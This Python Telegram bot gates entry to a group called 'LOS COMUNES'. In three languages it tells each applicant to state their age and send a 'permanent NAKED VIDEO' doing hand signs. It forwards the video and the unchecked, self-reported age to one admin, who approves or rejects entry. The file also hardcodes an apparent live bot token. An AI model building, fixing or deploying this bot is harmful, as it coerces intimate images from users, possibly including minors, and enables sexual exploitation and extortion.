import os

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ChatJoinRequestHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

TOKEN = "8797013447:AAHcfHxJC9H7RqfiegnUe2CMWCReUY32ozc"

pending_users = {}

GROUP_ID = -1003968636484
ADMIN_ID = 8011642705

TEXTS = {
    "es": {
        "welcome": (
            "Bienvenido al sistema de verificación de ingreso del grupo LOS COMUNES.\n\n"
            "Para continuar necesitás:\n"
            "• Decir tu edad\n"
            "• Enviar un VIDEO permanente parado DESNUDO haciendo estas señas:\n"
            "👌🤟"
        ),
        "ask_age": "Decí tu edad.",
        "ask_video": (
            "Ahora enviá un VIDEO permanente parado DESNUDO haciendo estas señas:\n"
            "👌🤟"
        ),
        "invalid_video": "Tenés que enviar un video válido.",
        "sent": "Solicitud enviada para revisión.",
        "approved": "Tu solicitud fue aprobada.",
        "rejected": "Tu solicitud fue rechazada.",
    },

    "en": {
        "welcome": (
            "Welcome to the LOS COMUNES verification system.\n\n"
            "To continue you must:\n"
            "• Tell your age\n"
            "• Send a permanent NAKED VIDEO standing up doing these hand signs:\n"
            "👌🤟"
        ),
        "ask_age": "Tell your age.",
        "ask_video": (
            "Now send a permanent NAKED VIDEO standing up doing these hand signs:\n"
            "👌🤟"
        ),
        "invalid_video": "You must send a valid video.",
        "sent": "Request sent for review.",
        "approved": "Your request was approved.",
        "rejected": "Your request was rejected.",
    },

    "pt": {
        "welcome": (
            "Bem-vindo ao sistema de verificação do grupo LOS COMUNES.\n\n"
            "Para continuar você precisa:\n"
            "• Dizer sua idade\n"
            "• Enviar um VÍDEO permanente em pé NU fazendo estes sinais:\n"
            "👌🤟"
        ),
        "ask_age": "Diga sua idade.",
        "ask_video": (
            "Agora envie um VÍDEO permanente em pé NU fazendo estes sinais:\n"
            "👌🤟"
        ),
        "invalid_video": "Você precisa enviar um vídeo válido.",
        "sent": "Solicitação enviada para revisão.",
        "approved": "Sua solicitação foi aprovada.",
        "rejected": "Sua solicitação foi rejeitada.",
    }
}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Seleccioná tu idioma / Select your language / Selecione seu idioma",
        reply_markup=reply_markup
    )


async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query
    await query.answer()

    lang = query.data.split("_")[1]

    user = query.from_user

    pending_users[user.id] = {
        "step": "age",
        "lang": lang,
        "username": user.username or user.first_name,
    }

    await query.message.reply_text(
        TEXTS[lang]["welcome"]
    )

    await query.message.reply_text(
        TEXTS[lang]["ask_age"]
    )


async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.chat_join_request.from_user

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:

        await context.bot.send_message(
            chat_id=user.id,
            text=(
                "🔒 LOS COMUNES Verification Bot\n\n"

                "Este bot realiza la verificación obligatoria "
                "para ingresar al grupo LOS COMUNES.\n\n"

                "This bot performs the mandatory verification "
                "required to join LOS COMUNES.\n\n"

                "Este bot realiza a verificação obrigatória "
                "para entrar no grupo LOS COMUNES.\n\n"

                "Seleccioná tu idioma para continuar.\n"
                "Select your language to continue.\n"
                "Selecione seu idioma para continuar."
            ),
            reply_markup=reply_markup
        )

    except:
        print("El usuario no inició el bot.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.effective_user.id

    if user_id not in pending_users:
        return

    step = pending_users[user_id]["step"]
    lang = pending_users[user_id]["lang"]

    if step == "age":

        pending_users[user_id]["age"] = update.message.text
        pending_users[user_id]["step"] = "video"

        await update.message.reply_text(
            TEXTS[lang]["ask_video"]
        )

    elif step == "video":

        if update.message.video:

            age = pending_users[user_id]["age"]
            username = pending_users[user_id]["username"]

            await context.bot.send_video(
                chat_id=ADMIN_ID,
                video=update.message.video.file_id,
                caption=(
                    f"Solicitud nueva\n\n"
                    f"Usuario: {username}\n"
                    f"Edad: {age}\n\n"
                    f"/aprobar {user_id}\n"
                    f"/rechazar {user_id}"
                )
            )

            await update.message.reply_text(
                TEXTS[lang]["sent"]
            )

            pending_users[user_id]["step"] = "done"

        else:

            await update.message.reply_text(
                TEXTS[lang]["invalid_video"]
            )


async def aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    await context.bot.approve_chat_join_request(
        chat_id=GROUP_ID,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "✅ Approved."
    )

    await update.message.reply_text(
        "Usuario aprobado."
    )


async def rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    await context.bot.decline_chat_join_request(
        chat_id=GROUP_ID,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "❌ Rejected."
    )

    await update.message.reply_text(
        "Usuario rechazado."
    )


app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))

app.add_handler(CallbackQueryHandler(language_selected))

app.add_handler(ChatJoinRequestHandler(join_request))

app.add_handler(
    MessageHandler(
        filters.TEXT | filters.VIDEO,
        handle_message
    )
)

app.add_handler(CommandHandler("aprobar", aprobar))
app.add_handler(CommandHandler("rechazar", rechazar))

print("Bot iniciado...")

app.run_polling()
